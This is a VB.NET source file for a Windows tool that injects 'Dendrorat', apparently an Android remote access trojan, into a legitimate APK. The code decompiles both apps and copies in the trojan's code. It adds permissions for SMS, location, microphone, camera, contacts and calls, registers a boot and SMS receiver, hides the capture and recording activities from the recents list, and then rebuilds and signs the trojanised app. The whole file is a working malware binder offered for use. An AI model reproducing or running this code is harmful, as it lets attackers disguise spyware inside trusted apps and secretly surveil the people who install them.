Imports System.Xml
Imports System.Threading
Imports System.Net

Public Class Form1
    Dim TargetAPKName As String
    Dim SourceAPKName As String
    Private Sub Form1_Load(ByVal sender As Object, ByVal e As System.EventArgs)
        CheckForIllegalCrossThreadCalls = False
    End Sub

    'Open file dialog to select the Source apk path.
    Private Sub SourceApkPath_Enter(ByVal sender As Object, ByVal e As System.EventArgs) Handles SourceApkPath.Enter
        Dim ofd As New OpenFileDialog
        ofd.InitialDirectory = My.Computer.FileSystem.CurrentDirectory
        If ofd.ShowDialog = DialogResult.OK Then
            SourceApkPath.Text = ofd.FileName
        End If
    End Sub
    'Open file dialog to select the target apk path.
    Private Sub TargetApkPath_Enter(ByVal sender As Object, ByVal e As System.EventArgs) Handles TargetApkPath.Enter
        Dim ofd As New OpenFileDialog
        ofd.InitialDirectory = My.Computer.FileSystem.CurrentDirectory
        If ofd.ShowDialog = DialogResult.OK Then
            TargetApkPath.Text = ofd.FileName
        End If
    End Sub

    'Log post control section, types info into the log.
    Public Sub PostLog(ByVal message As String)
        If Not message = String.Empty Then
            Log.Text &= String.Format("[{0}] {1}{2}", Now.ToString("hh:mm:ss tt"), message, vbCrLf)
            Log.SelectionStart = Log.TextLength
            Log.ScrollToCaret()
        End If
    End Sub

    'Exectue command line funtions, for apktool/apk signing
    Public Function Execute(ByVal filePath As String, ByVal arguments As String)
        Try
            Dim _process = New Process()
            _process.StartInfo.FileName = filePath
            _process.StartInfo.UseShellExecute = False
            _process.StartInfo.RedirectStandardError = True
            _process.StartInfo.Arguments = arguments
            _process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
            _process.StartInfo.CreateNoWindow = True
            _process.EnableRaisingEvents = True
            AddHandler _process.ErrorDataReceived, _
            AddressOf _process_OutputDataReceived
            _process.Start()
            _process.BeginErrorReadLine()
            _process.WaitForExit()
            _process.Close()
            _process.Dispose()
            Return "OK"
        Catch err As Exception
            Return err.Message
        End Try
    End Function
    'Event handler to receive the command line output and pass it to the log.
    Private Sub _process_OutputDataReceived(ByVal sendingProcess As Object, _
     ByVal outLine As DataReceivedEventArgs)
        PostLog(outLine.Data)
    End Sub

    'Uses .net XML Editor to read/write to the manifest
    Public Function EditManifestPermissions(ByVal Filepath As String)
        Dim XMLDom As New XmlDocument()
        XMLDom.Load(Filepath)
        Dim newXMLNode As XmlNode = XMLDom.SelectSingleNode("/manifest")
        Dim perm1 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm2 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm3 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm4 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm5 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm6 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm7 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm8 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm9 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm10 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm11 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm12 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm13 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm14 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm15 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm16 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm17 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm18 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-permission", "")
        Dim perm19 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-feature", "")
        Dim perm20 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "uses-feature", "")

        Dim newAttribute1 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute1.Value = "android.permission.WAKE_LOCK"
        perm1.Attributes.Append(newAttribute1)
        newXMLNode.AppendChild(perm1)
        Dim newAttribute2 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute2.Value = "android.permission.READ_SMS"
        perm2.Attributes.Append(newAttribute2)
        newXMLNode.AppendChild(perm2)
        Dim newAttribute3 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute3.Value = "android.permission.SEND_SMS"
        perm3.Attributes.Append(newAttribute3)
        newXMLNode.AppendChild(perm3)
        Dim newAttribute4 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute4.Value = "android.permission.READ_PHONE_STATE"
        perm4.Attributes.Append(newAttribute4)
        newXMLNode.AppendChild(perm4)
        Dim newAttribute5 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute5.Value = "android.permission.PROCESS_OUTGOING_CALLS"
        perm5.Attributes.Append(newAttribute5)
        newXMLNode.AppendChild(perm5)
        Dim newAttribute6 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute6.Value = "android.permission.ACCESS_NETWORK_STATE"
        perm6.Attributes.Append(newAttribute6)
        newXMLNode.AppendChild(perm6)
        Dim newAttribute7 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute7.Value = "android.permission.ACCESS_FINE_LOCATION"
        perm7.Attributes.Append(newAttribute7)
        newXMLNode.AppendChild(perm7)
        Dim newAttribute8 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute8.Value = "android.permission.INTERNET"
        perm8.Attributes.Append(newAttribute8)
        newXMLNode.AppendChild(perm8)
        Dim newAttribute9 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute9.Value = "android.permission.RECORD_AUDIO"
        perm9.Attributes.Append(newAttribute9)
        newXMLNode.AppendChild(perm9)
        Dim newAttribute10 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute10.Value = "android.permission.WRITE_EXTERNAL_STORAGE"
        perm10.Attributes.Append(newAttribute10)
        newXMLNode.AppendChild(perm10)
        Dim newAttribute11 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute11.Value = "android.permission.CAMERA"
        perm11.Attributes.Append(newAttribute11)
        newXMLNode.AppendChild(perm11)
        Dim newAttribute12 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute12.Value = "android.permission.RECEIVE_BOOT_COMPLETED"
        perm12.Attributes.Append(newAttribute12)
        newXMLNode.AppendChild(perm12)
        Dim newAttribute13 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute13.Value = "android.permission.CALL_PHONE"
        perm13.Attributes.Append(newAttribute13)
        newXMLNode.AppendChild(perm13)
        Dim newAttribute14 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute14.Value = "android.permission.READ_CONTACTS"
        perm14.Attributes.Append(newAttribute14)
        newXMLNode.AppendChild(perm14)
        Dim newAttribute15 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute15.Value = "android.permission.WRITE_SETTINGS"
        perm15.Attributes.Append(newAttribute15)
        newXMLNode.AppendChild(perm15)
        Dim newAttribute16 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute16.Value = "android.permission.GET_ACCOUNTS"
        perm16.Attributes.Append(newAttribute16)
        newXMLNode.AppendChild(perm16)
        Dim newAttribute17 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute17.Value = "com.android.browser.permission.READ_HISTORY_BOOKMARKS"
        perm17.Attributes.Append(newAttribute17)
        newXMLNode.AppendChild(perm17)
        Dim newAttribute18 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute18.Value = "android.permission.GET_TASKS"
        perm18.Attributes.Append(newAttribute18)
        newXMLNode.AppendChild(perm18)
        Dim newAttribute19 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute19.Value = "android.hardware.camera"
        perm19.Attributes.Append(newAttribute19)
        newXMLNode.AppendChild(perm19)
        Dim newAttribute20 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        newAttribute20.Value = "android.hardware.camera.front"
        perm20.Attributes.Append(newAttribute20)
        newXMLNode.AppendChild(perm20)

        XMLDom.Save(Filepath)

        Return "DONE"
    End Function
    Public Function EditManifestBootReceiver(ByVal Filepath As String)
        Dim XMLDom As New XmlDocument()
        XMLDom.Load(Filepath)
        Dim newXMLNode As XmlNode = XMLDom.SelectSingleNode("/manifest/application")
        Dim receiver As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "receiver", String.Empty)
        Dim intentfilter As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "intent-filter", String.Empty)
        Dim action As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "action", String.Empty)
        Dim action2 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "action", String.Empty)
        Dim action3 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "action", String.Empty)
        Dim action4 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "action", String.Empty)
        Dim action5 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "action", String.Empty)
        Dim action6 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "action", String.Empty)

        'In the below step "name" is your node name and "sree" is your data to insert
        Dim receiverattribute As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim receiverattribute2 As XmlAttribute = XMLDom.CreateAttribute("android", "enabled", "http://schemas.android.com/apk/res/android")
        Dim receiverattribute3 As XmlAttribute = XMLDom.CreateAttribute("android", "exported", "http://schemas.android.com/apk/res/android")

        Dim actionattribute As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim actionattribute2 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim actionattribute3 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim actionattribute4 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim actionattribute5 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim actionattribute6 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")

        Dim categoryattribute As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim intentattribute As XmlAttribute = XMLDom.CreateAttribute("android", "priority", "http://schemas.android.com/apk/res/android")

        receiverattribute.Value = "com.connect.ServiceReceiver"
        receiverattribute2.Value = "true"
        receiverattribute3.Value = "true"
        intentattribute.Value = "1000"
        actionattribute.Value = "android.intent.action.BOOT_COMPLETED"
        actionattribute2.Value = "android.provider.Telephony.SMS_RECEIVED"
        actionattribute3.Value = "android.intent.action.SCREEN_OFF"
        actionattribute4.Value = "android.intent.action.SCREEN_ON"
        actionattribute5.Value = "android.intent.action.PHONE_STATE"
        actionattribute6.Value = "android.intent.action.ACTION_EXTERNAL_APPLICATIONS_AVAILABLE"

        receiver.Attributes.Append(receiverattribute)
        receiver.Attributes.Append(receiverattribute2)
        receiver.Attributes.Append(receiverattribute3)
        action.Attributes.Append(actionattribute)
        action2.Attributes.Append(actionattribute2)
        action3.Attributes.Append(actionattribute3)
        action4.Attributes.Append(actionattribute4)
        action5.Attributes.Append(actionattribute5)
        action6.Attributes.Append(actionattribute6)
        intentfilter.Attributes.Append(intentattribute)

        receiver.AppendChild(intentfilter).AppendChild(action)
        receiver.ChildNodes(0).AppendChild(action2)
        receiver.ChildNodes(0).AppendChild(action3)
        receiver.ChildNodes(0).AppendChild(action4)
        receiver.ChildNodes(0).AppendChild(action5)
        receiver.ChildNodes(0).AppendChild(action6)
        newXMLNode.AppendChild(receiver)
        XMLDom.Save(Filepath)
        Return "DONE"
    End Function
    Public Function EditManifestOther(ByVal Filepath As String)
        Dim XMLDom As New XmlDocument()
        XMLDom.Load(Filepath)
        Dim newXMLNode As XmlNode = XMLDom.SelectSingleNode("/manifest/application")

        Dim Activity1 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "activity", "")
        Dim Activity2 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "activity", "")
        Dim Activity3 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "activity", "")
        Dim Activity4 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "activity", "")
        Dim Service1 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "service", "")
        Dim Service2 As XmlNode = XMLDom.CreateNode(XmlNodeType.Element, "service", "")

        'In the below step "name" is your node name and "sree" is your data to insert
        Dim Label1 As XmlAttribute = XMLDom.CreateAttribute("android", "excludeFromRecents", "http://schemas.android.com/apk/res/android")
        Dim Label2 As XmlAttribute = XMLDom.CreateAttribute("android", "excludeFromRecents", "http://schemas.android.com/apk/res/android")
        Dim Label3 As XmlAttribute = XMLDom.CreateAttribute("android", "excludeFromRecents", "http://schemas.android.com/apk/res/android")
        Dim Label4 As XmlAttribute = XMLDom.CreateAttribute("android", "excludeFromRecents", "http://schemas.android.com/apk/res/android")

        Dim ActivityName1 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim ActivityName2 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim ActivityName3 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim ActivityName4 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim ServiceName1 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")
        Dim ServiceName2 As XmlAttribute = XMLDom.CreateAttribute("android", "name", "http://schemas.android.com/apk/res/android")

        Label1.Value = "true"
        Label2.Value = "true"
        Label3.Value = "true"
        Label4.Value = "true"
        ActivityName1.Value = "com.connect.Dialog"
        ActivityName2.Value = "com.connect.CaptureCameraImage"
        ActivityName3.Value = "com.connect.CameraView"
        ActivityName4.Value = "com.connect.VideoView"
        ServiceName1.Value = "com.connect.MyService"
        ServiceName2.Value = "com.connect.RecordService"
        Activity1.Attributes.Append(ActivityName1)
        Activity1.Attributes.Append(Label1)
        Activity2.Attributes.Append(ActivityName2)
        Activity2.Attributes.Append(Label2)
        Activity3.Attributes.Append(ActivityName3)
        Activity3.Attributes.Append(Label3)
        Activity4.Attributes.Append(ActivityName4)
        Activity4.Attributes.Append(Label4)
        Service1.Attributes.Append(ServiceName1)
        Service2.Attributes.Append(ServiceName2)
        newXMLNode.AppendChild(Activity1)
        newXMLNode.AppendChild(Activity2)
        newXMLNode.AppendChild(Activity3)
        newXMLNode.AppendChild(Activity4)
        newXMLNode.AppendChild(Service1)
        newXMLNode.AppendChild(Service2)
        XMLDom.Save(Filepath)
        PostLog("AndroidManifest.xml Done.")
        Return "DONE"
    End Function

    Public Sub Run()
        Try
            Dim dir As String = My.Computer.FileSystem.CurrentDirectory & "\"
            If Not My.Computer.FileSystem.FileExists(SourceApkPath.Text) Then
                MessageBox.Show("Unable to locate the Source apk file, please check your filepath and try again!")
                Exit Sub
            End If
            If Not My.Computer.FileSystem.FileExists(TargetApkPath.Text) Then
                MessageBox.Show("Unable to locate the target apk file, please check your filepath and try again!")
                Exit Sub
            End If
            If My.Computer.FileSystem.DirectoryExists(dir & SourceAPKName) Then
                System.IO.Directory.Delete(dir & SourceAPKName, True)
            End If
            If My.Computer.FileSystem.DirectoryExists(dir & TargetAPKName) Then
                System.IO.Directory.Delete(dir & TargetAPKName, True)
            End If
            If Not Execute("cmd.exe", "/c java -jar """ & dir & "apktool.jar"" d """ & SourceApkPath.Text & """") = "OK" Then
                Exit Sub
            End If
recheck:
            If Log.Text.Contains("Done") Then
                If My.Computer.FileSystem.DirectoryExists(dir & SourceAPKName) Then
                    PostLog("Pausing 10 Seconds to finish decompiling Dendrorat")
                    Dim stopW As New Stopwatch
                    stopW.Start()
                    Do While stopW.ElapsedMilliseconds < 10000
                        ' Allows your UI to remain responsive
                        Application.DoEvents()
                    Loop
                    stopW.Stop()
                Else
                    Dim stopW As New Stopwatch
                    stopW.Start()
                    Do While stopW.ElapsedMilliseconds < 5000
                        Application.DoEvents()
                    Loop
                    stopW.Stop()
                    GoTo recheck
                End If
            Else
                Dim stopW As New Stopwatch
                stopW.Start()
                Do While stopW.ElapsedMilliseconds < 5000
                    Application.DoEvents()
                Loop
                stopW.Stop()
                GoTo recheck
            End If
            If Log.Text.Contains("error") Then
                PostLog("Problem occured after attempting to decompile dendrorat.")
                Exit Sub
            End If
            If Not Execute("cmd.exe", "/c java -jar """ & dir & "apktool.jar"" d """ & TargetApkPath.Text & """") = "OK" Then
                Exit Sub
            End If
            If Log.Text.Contains("error") Then
                PostLog("Problem occured after attempting to decompile target.")
                Exit Sub
            End If
            PostLog("Injecting Dendrorat Source.")
            FileIO.FileSystem.CopyDirectory(dir & SourceAPKName & "\smali", My.Computer.FileSystem.CurrentDirectory & "\" & TargetAPKName & "\smali")

            If Not EditManifestPermissions(dir & TargetAPKName & "\AndroidManifest.xml") = "DONE" Then
                Exit Sub
            End If
            If Not EditManifestBootReceiver(dir & TargetAPKName & "\AndroidManifest.xml") = "DONE" Then
                Exit Sub
            End If
            If Not EditManifestOther(dir & TargetAPKName & "\AndroidManifest.xml") = "DONE" Then
                Exit Sub
            End If

            PostLog("Building Injected APK.")
            If Not Execute("cmd.exe", "/c java -jar """ & dir & "apktool.jar"" b """ & My.Computer.FileSystem.CurrentDirectory & "\" & TargetAPKName & """") = "OK" Then
                Exit Sub
            End If
            If Log.Text.Contains("error") Then
                PostLog("Problem occured after attempting to re-compile the apk.")
                Exit Sub
            End If
            If Not Execute("cmd.exe", "/c java -jar """ & My.Computer.FileSystem.CurrentDirectory & "\framework\signapk.jar"" """ & My.Computer.FileSystem.CurrentDirectory & "\framework\publickey.x509.pem"" """ & My.Computer.FileSystem.CurrentDirectory & "\framework\privatekey.pk8"" """ & My.Computer.FileSystem.CurrentDirectory & "\" & TargetAPKName & "\dist\" & TargetAPKName & ".apk"" """ & My.Computer.FileSystem.CurrentDirectory & "\FINISHED.apk") = "OK" Then
                Exit Sub
            Else
                PostLog("Job Completed!")
            End If
            System.IO.Directory.Delete(My.Computer.FileSystem.CurrentDirectory & "\" & TargetAPKName, True)
            System.IO.Directory.Delete(My.Computer.FileSystem.CurrentDirectory & "\" & SourceAPKName, True)

        Catch ex As Exception
            PostLog(ex.Message)
        End Try
    End Sub


    Private Sub ReactorButton1_Click(sender As Object, e As EventArgs) Handles ReactorButton1.Click
        TargetAPKName = TargetApkPath.Text.Substring(TargetApkPath.Text.LastIndexOf("\") + 1)
        TargetAPKName = TargetAPKName.Remove(TargetAPKName.LastIndexOf("."), 4)
        SourceAPKName = SourceApkPath.Text.Substring(SourceApkPath.Text.LastIndexOf("\") + 1)
        SourceAPKName = SourceAPKName.Remove(SourceAPKName.LastIndexOf("."), 4)

        Dim T As New Thread(AddressOf Run)
        T.Start()
    End Sub
End Class
